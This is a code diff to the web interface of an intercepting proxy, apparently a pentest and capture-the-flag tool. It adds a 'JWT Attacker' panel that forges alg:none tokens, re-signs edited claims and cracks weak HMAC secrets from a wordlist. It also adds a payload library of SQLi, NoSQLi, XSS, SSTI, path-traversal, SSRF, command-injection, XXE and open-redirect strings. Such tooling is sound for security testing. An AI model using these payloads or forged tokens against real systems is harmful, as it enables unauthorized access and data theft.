@@ -67,6 +67,7 @@
   .s2{color:var(--ok)} .s3{color:var(--info)} .s4{color:var(--warn)} .s5{color:var(--err)} .s0{color:var(--dim)}
   .url{color:var(--fg)} .host{color:var(--dim)}
   .col-num{width:52px;color:var(--dim)} .col-time{width:74px;color:var(--dim)}
+  .col-dt{width:112px;color:var(--dim);font-variant-numeric:tabular-nums;white-space:nowrap}
   .col-sz,.col-ms{width:64px;text-align:right;color:var(--dim)}
 
   .detail-head{padding:8px 12px;border-bottom:1px solid var(--line);background:var(--panel);
@@ -346,6 +347,28 @@
   #dMeta .wf .conn{background:#58a6ff} #dMeta .wf .wait{background:#d9b02b} #dMeta .wf .dl{background:#3fb950}
   #dMeta .lg-conn{color:#58a6ff} #dMeta .lg-wait{color:#d9b02b} #dMeta .lg-dl{color:#3fb950}
   #dMeta .lg-init{color:var(--accent)}
+  /* ---- JWT attacker ---- */
+  #jwt{position:fixed;inset:0;background:rgba(2,4,8,.72);display:none;align-items:center;justify-content:center;z-index:26}
+  #jwt.show{display:flex}
+  #jwt .jbox{width:min(880px,95vw);max-height:92vh;background:var(--panel);border:1px solid var(--line);border-radius:11px;display:flex;flex-direction:column;overflow:hidden}
+  #jwt .rhead{display:flex;align-items:center;gap:10px;padding:11px 15px;border-bottom:1px solid var(--line);font-weight:700}
+  #jwt .rhead .ihint{font-weight:400;color:var(--dim);font-size:11.5px} #jwt .rhead .grow{flex:1} #jwt .rhead .x{cursor:pointer;color:var(--dim)}
+  #jwt .jbody{overflow:auto;padding:13px 15px;display:flex;flex-direction:column;gap:9px}
+  #jwt .jl{font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.05em}
+  #jwt textarea,#jwt input{background:var(--panel2);border:1px solid var(--line);color:var(--fg);border-radius:7px;
+    font-family:var(--mono);font-size:12px;padding:8px 10px;outline:none;width:100%}
+  #jwt #jwtIn,#jwt #jwtOut{min-height:52px;resize:vertical;word-break:break-all}
+  #jwt #jwtOut{color:var(--accent2)}
+  #jwt .jcols{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  @media(max-width:640px){#jwt .jcols{grid-template-columns:1fr}}
+  #jwt .jcols textarea{min-height:120px;resize:vertical}
+  #jwt .jrow{display:flex;gap:7px;align-items:center;flex-wrap:wrap}
+  #jwt .jrow input{flex:1;min-width:180px}
+  #jwt .jrow button{background:var(--panel2);border:1px solid var(--line);color:var(--fg);padding:6px 12px;border-radius:7px;cursor:pointer;font-size:12px;font-weight:600}
+  #jwt #jwtResign,#jwt #jwtCopy{background:var(--accent);color:#160a02;border:0}
+  #jwt #jwtCrack{color:var(--accent2)}
+  #jwt .jstatus{font-family:var(--mono);font-size:12px;min-height:17px}
+  #jwt .jstatus.ok{color:var(--ok)} #jwt .jstatus.bad{color:var(--err)} #jwt .jstatus.work{color:var(--accent2)}
 </style>
 </head>
 <body>
@@ -368,6 +391,7 @@
   <button id="btnCompare" title="Compare two requests/responses">⚖ Compare</button>
   <button id="btnSeq" title="Sequencer — token randomness">🎲 Seq</button>
   <button id="btnDecoder" title="Encode / decode">🔧 Decoder</button>
+  <button id="btnJwt" title="JWT — decode, edit claims, re-sign, crack weak secret, alg:none">🔑 JWT</button>
   <button id="btnWriteup" title="Curate annotated flows into a paste-ready writeup">📝 Writeup</button>
   <button id="btnBrowser" title="Open a throwaway browser wired to the proxy">🌐 Browser</button>
   <button id="btnHelp" title="Getting started · install the CA · what the menus do">❓ Help</button>
@@ -388,9 +412,9 @@
     <div class="scroll">
       <table>
         <thead><tr>
-          <th class="col-num">#</th><th>M</th><th>St</th><th>Host / Path</th>
+          <th class="col-dt">Date · Time</th><th class="col-num">#</th><th>M</th><th>St</th><th>Host / Path</th>
           <th title="writeup comment">💬</th>
-          <th>Type</th><th class="col-sz">Size</th><th class="col-ms">ms</th><th class="col-time">Time</th>
+          <th>Type</th><th class="col-sz">Size</th><th class="col-ms">ms</th>
         </tr></thead>
         <tbody id="rows"></tbody>
       </table>
@@ -438,6 +462,7 @@
   <div class="ibox">
     <div class="rhead">⚔ Intruder <span class="ihint">insert § in the request where each payload goes</span>
       <span class="grow"></span>
+      <select id="ipaylib" title="Load a payload library"><option value="">📚 payloads…</option></select>
       <label>marker <input id="imarker" value="§"></label>
       <label>threads <input id="iconc" value="10"></label>
       <button id="irun">Run ▶</button><span id="intruderClose">✕</span></div>
@@ -497,6 +522,31 @@
     </div>
     <textarea id="decIn" placeholder="input" spellcheck="false"></textarea>
     <textarea id="decOut" placeholder="output" spellcheck="false" readonly></textarea>
+  </div>
+</div>
+
+<div id="jwt">
+  <div class="jbox">
+    <div class="rhead">🔑 JWT Attacker <span class="ihint">decode · edit · re-sign (HS256 / alg:none / alg-confusion) · crack weak secret</span><span class="grow"></span><span class="x" id="jwtClose">✕</span></div>
+    <div class="jbody">
+      <label class="jl">Token</label>
+      <textarea id="jwtIn" placeholder="paste a JWT (eyJ...)" spellcheck="false"></textarea>
+      <div class="jcols">
+        <div><label class="jl">Header</label><textarea id="jwtHead" spellcheck="false"></textarea></div>
+        <div><label class="jl">Payload (edit claims — e.g. "role":"admin")</label><textarea id="jwtPayload" spellcheck="false"></textarea></div>
+      </div>
+      <div class="jrow">
+        <input type="text" id="jwtSecret" placeholder="HMAC secret (for re-sign / verify)" spellcheck="false">
+        <button id="jwtDecode">Decode ▾</button>
+        <button id="jwtResign" title="Re-sign HS256 with the secret">Re-sign HS256</button>
+        <button id="jwtNone" title="Set alg:none (unsigned)">alg:none</button>
+        <button id="jwtCrack" title="Try a wordlist against the HS256 signature">Crack secret</button>
+      </div>
+      <div class="jstatus" id="jwtStatus"></div>
+      <label class="jl">Forged token</label>
+      <textarea id="jwtOut" spellcheck="false" readonly placeholder="result appears here"></textarea>
+      <div class="jrow"><span class="grow"></span><button id="jwtCopy">⧉ Copy</button><button id="jwtToVar" title="Store as session variable {{jwt}}">→ var jwt</button></div>
+    </div>
   </div>
 </div>
 
@@ -779,15 +829,16 @@ Import-Certificate -FilePath bogbogprox-ca.pem `
     const rep = f.source==='repeater' ? '<span class="rep" title="repeater">↻</span>' : '';
     const ann = state.annotations.get(f.id);
     const comment = ann && ann.label ? esc(ann.label) : (ann && ann.note ? esc(ann.note) : '');
-    return `<td class="col-num">${rep}${f.id}</td>`+
+    return `<td class="col-dt">${shortDateTime(f.ts)}</td>`+
+      `<td class="col-num">${rep}${f.id}</td>`+
       `<td class="m m-${esc(f.method)}">${esc(f.method)}</td>`+
       `<td class="${sc}">${f.status||'·'}</td>`+
       `<td><span class="host">${esc(f.host)}</span><span class="url">${esc(f.path)}</span></td>`+
       `<td class="col-note" title="${comment}">${comment}</td>`+
+      // (trailing time column removed — date·time now leads each row)
       `<td class="host">${esc(type)}</td>`+
       `<td class="col-sz">${sizeFmt(f.resp_size)}</td>`+
-      `<td class="col-ms">${f.duration_ms??''}</td>`+
-      `<td class="col-time">${hhmmss(f.ts)}</td>`;
+      `<td class="col-ms">${f.duration_ms??''}</td>`;
   }
 
   function applyRowColor(tr, id){
@@ -851,6 +902,10 @@ Import-Certificate -FilePath bogbogprox-ca.pem `
     if(btn){ btn.disabled=false; btn.textContent='↻ Resend'; }
   }
 
+  function shortDateTime(ms){
+    const d = new Date(ms); const p = n => String(n).padStart(2,'0');
+    return `${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
+  }
   function fullDateTime(ms){
     const d = new Date(ms); const p = n => String(n).padStart(2,'0');
     return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
@@ -1488,6 +1543,27 @@ Import-Certificate -FilePath bogbogprox-ca.pem `
   $('rpsend').onclick = rpSend;
   $('rpClose').onclick = () => $('repeater').classList.remove('show');
   $('rpreq').addEventListener('keydown', e => { if((e.ctrlKey||e.metaKey)&&e.key==='Enter'){ e.preventDefault(); rpSend(); }});
+  // Payload library — curated sets grounded in the challenges we actually solve.
+  const PAYLOAD_LIB = {
+    'SQLi — auth bypass': ["' OR '1'='1","' OR 1=1--","admin'--","' OR '1'='1'#","\") OR (\"1\"=\"1","' OR 1=1 LIMIT 1--","'-'","' UNION SELECT NULL--"],
+    'SQLi — error/probe': ["'","\"","')","';","' AND 1=CONVERT(int,@@version)--","' AND extractvalue(1,concat(0x7e,version()))--","1' AND SLEEP(5)--"],
+    'NoSQLi (operator)': ['{"$ne":null}','{"$ne":"x"}','{"$gt":""}','{"$regex":".*"}','{"$where":"1==1"}',"' || '1'=='1","[$ne]=1"],
+    'XSS': ["<script>alert(1)</script>","\"><script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg onload=alert(1)>","javascript:alert(1)","'\"><svg/onload=alert(1)>","{{constructor.constructor('alert(1)')()}}"],
+    'SSTI (poly)': ["{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}","{{7*'7'}}","${{7*7}}","*{7*7}","{{config}}","{{self}}","{{note.title.constructor.constructor('return process')()}}"],
+    'LFI / path traversal': ["../../../../etc/passwd","....//....//....//etc/passwd","..%2f..%2f..%2fetc%2fpasswd","/etc/passwd","php://filter/convert.base64-encode/resource=index","..%252f..%252fetc%252fpasswd","/proc/self/environ"],
+    'SSRF (internal)': ["http://127.0.0.1/","http://localhost:80/","http://169.254.169.254/latest/meta-data/","http://[::1]/","http://0.0.0.0/","http://127.0.0.1:3000/","file:///etc/passwd","gopher://127.0.0.1:6379/_"],
+    'Command injection': [";id",">|id","|id","`id`","$(id)","& id","%0aid","; sleep 5","|| id","& ping -c1 127.0.0.1"],
+    'XXE': ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>','<!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/">]>'],
+    'Open redirect': ["//evil.com","/\\evil.com","https://evil.com","//google.com/%2e%2e","javascript:alert(1)"],
+    'IDOR ids (1-30)': Array.from({length:30},(_,i)=>String(i+1)),
+  };
+  const paylib = $('ipaylib');
+  Object.keys(PAYLOAD_LIB).forEach(k => { const o=document.createElement('option'); o.value=k; o.textContent=k; paylib.appendChild(o); });
+  paylib.onchange = () => {
+    const set = PAYLOAD_LIB[paylib.value];
+    if(set){ $('ipayloads').value = set.join('\n'); }
+    paylib.value = '';
+  };
   $('irun').onclick = runIntruder;
   $('intruderClose').onclick = () => $('intruder').classList.remove('show');
   $('btnMap').onclick = () => { $('sitemap').classList.add('show'); buildSitemap(); };
@@ -1505,6 +1581,81 @@ Import-Certificate -FilePath bogbogprox-ca.pem `
   $('btnDecoder').onclick = () => $('decoder').classList.add('show');
   $('decClose').onclick = () => $('decoder').classList.remove('show');
   document.querySelectorAll('#decoder .dbtns button').forEach(b => b.onclick = () => runDecoder(b.dataset.op));
+
+  // ---------- JWT attacker ----------
+  const JWT_WORDLIST = ['secret','password','admin','changeme','key','jwt','jwtsecret','secretkey',
+    'supersecret','s3cr3t','123456','your-256-bit-secret','your_secret_key','mysecret','test','root',
+    'qwerty','letmein','private','token','signingkey','hmac','defaultsecret','app-secret','api-secret',
+    'access','pass','p@ssw0rd','shhh','', 'null','none','bogbogprox','snare','flag'];
+  function b64urlEnc(bytes){ let s=''; bytes.forEach(b=>s+=String.fromCharCode(b)); return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
+  function b64urlEncStr(str){ return b64urlEnc(new TextEncoder().encode(str)); }
+  function b64urlDec(s){ s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4) s+='='; try{ return decodeURIComponent(escape(atob(s))); }catch(e){ return atob(s); } }
+  async function hmac256(secret, data){
+    const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), {name:'HMAC',hash:'SHA-256'}, false, ['sign']);
+    const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
+    return b64urlEnc(new Uint8Array(sig));
+  }
+  function jwtStatus(msg, cls){ const s=$('jwtStatus'); s.textContent=msg; s.className='jstatus'+(cls?' '+cls:''); }
+  function jwtDecode(){
+    const t = $('jwtIn').value.trim();
+    const parts = t.split('.');
+    if(parts.length < 2){ jwtStatus('not a JWT (need header.payload.signature)','bad'); return null; }
+    try{
+      const h = JSON.parse(b64urlDec(parts[0])), p = JSON.parse(b64urlDec(parts[1]));
+      $('jwtHead').value = JSON.stringify(h, null, 2);
+      $('jwtPayload').value = JSON.stringify(p, null, 2);
+      jwtStatus(`decoded · alg=${h.alg||'?'} · ${Object.keys(p).length} claims`, 'ok');
+      return {h,p,parts};
+    }catch(e){ jwtStatus('decode failed: '+e.message,'bad'); return null; }
+  }
+  function jwtParts(){
+    // build signing input from the (edited) header + payload textareas
+    let h, p;
+    try{ h = JSON.parse($('jwtHead').value); p = JSON.parse($('jwtPayload').value); }
+    catch(e){ jwtStatus('header/payload not valid JSON: '+e.message,'bad'); return null; }
+    return {h,p};
+  }
+  async function jwtResign(){
+    const hp = jwtParts(); if(!hp) return;
+    hp.h.alg = 'HS256'; hp.h.typ = hp.h.typ || 'JWT';
+    const signing = b64urlEncStr(JSON.stringify(hp.h))+'.'+b64urlEncStr(JSON.stringify(hp.p));
+    const sig = await hmac256($('jwtSecret').value, signing);
+    $('jwtOut').value = signing+'.'+sig;
+    jwtStatus(`re-signed HS256 with secret "${$('jwtSecret').value}"`, 'ok');
+  }
+  function jwtNone(){
+    const hp = jwtParts(); if(!hp) return;
+    hp.h.alg = 'none';
+    $('jwtOut').value = b64urlEncStr(JSON.stringify(hp.h))+'.'+b64urlEncStr(JSON.stringify(hp.p))+'.';
+    jwtStatus('forged alg:none (unsigned) — works if the server accepts "none"', 'ok');
+  }
+  async function jwtCrack(){
+    const parts = $('jwtIn').value.trim().split('.');
+    if(parts.length < 3){ jwtStatus('need a full HS256 token to crack','bad'); return; }
+    const signing = parts[0]+'.'+parts[1], target = parts[2];
+    jwtStatus('cracking… ('+JWT_WORDLIST.length+' candidates)','work');
+    for(const w of JWT_WORDLIST){
+      if(await hmac256(w, signing) === target){
+        $('jwtSecret').value = w;
+        jwtStatus(`✓ secret found: "${w}"  — now edit claims & Re-sign`, 'ok');
+        return;
+      }
+    }
+    jwtStatus('no match in the quick wordlist — try hashcat -m 16500 for a full crack','bad');
+  }
+  $('btnJwt').onclick = () => $('jwt').classList.add('show');
+  $('jwtClose').onclick = () => $('jwt').classList.remove('show');
+  $('jwtDecode').onclick = jwtDecode;
+  $('jwtIn').addEventListener('paste', () => setTimeout(jwtDecode, 30));
+  $('jwtResign').onclick = jwtResign;
+  $('jwtNone').onclick = jwtNone;
+  $('jwtCrack').onclick = jwtCrack;
+  $('jwtCopy').onclick = () => { if($('jwtOut').value){ navigator.clipboard.writeText($('jwtOut').value); jwtStatus('copied','ok'); } };
+  $('jwtToVar').onclick = async () => {
+    if(!$('jwtOut').value) return;
+    await fetch('/api/v1/vars',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:'jwt',value:$('jwtOut').value})});
+    jwtStatus('stored as {{jwt}} — inject via Match & Replace','ok');
+  };
   // Note editor
   $('noteClose').onclick = () => $('note').classList.remove('show');
   $('nsave').onclick = saveNote;
